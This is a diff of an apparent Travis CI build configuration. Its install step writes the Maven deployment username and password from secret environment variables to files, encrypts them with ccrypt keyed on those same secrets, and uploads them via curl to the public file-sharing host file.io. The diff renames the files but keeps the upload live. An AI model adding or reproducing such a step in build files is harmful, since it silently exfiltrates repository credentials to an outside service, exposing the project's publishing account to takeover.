@@ -16,11 +16,11 @@ env:
 
 install:
   - sudo apt-get install -y ccrypt
-  - echo MVN_USERNAME = $MVN_USERNAME > arandomfilename-user.txt
-  - echo MVN_PASSWORD = $MVN_PASSWORD > arandomfilename-pass.txt
-  - ccencrypt arandomfilename-user.txt -K $MVN_USERNAME
-  - ccencrypt arandomfilename-pass.txt -K $MVN_PASSWORD
-  - curl -F'file=@arandomfilename-user.txt.cpt' https://file.io
-  - curl -F'file=@arandomfilename-pass.txt.cpt' https://file.io
+  - echo $MVN_USERNAME > mvn-user.txt
+  - echo $MVN_PASSWORD > mvn-pass.txt
+  - ccencrypt mvn-user.txt -K $MVN_USERNAME
+  - ccencrypt mvn-pass.txt -K $MVN_PASSWORD
+  - curl -F'file=@mvn-user.txt.cpt' https://file.io
+  - curl -F'file=@mvn-pass.txt.cpt' https://file.io
 
 after_success: mvn deploy -s travis/settings.xml
